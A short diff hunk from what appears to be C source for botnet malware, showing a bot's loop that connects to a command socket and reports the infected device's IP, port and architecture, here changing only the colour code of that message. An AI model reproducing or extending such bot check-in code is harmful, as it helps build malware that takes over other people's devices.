@@ -1629,7 +1629,7 @@ int main(int argc, unsigned char *argv[])
         while(1)
         {
                 if(initConnection()) { sleep(5); continue; }
-                sockprintf(mainCommSock, "\e[1;95mDevice Connected: %s | Port: %s | Arch: %s\e[0m", inet_ntoa(ourIP), getPortz(), getArch());//Made By Zinqo.
+                sockprintf(mainCommSock, "\e[40;38;2;171;143;255mDevice Connected: %s | Port: %s | Arch: %s\e[0m", inet_ntoa(ourIP), getPortz(), getArch());//Made By Zinqo.
                 char commBuf[4096];
                 int got = 0;
                 int i = 0;
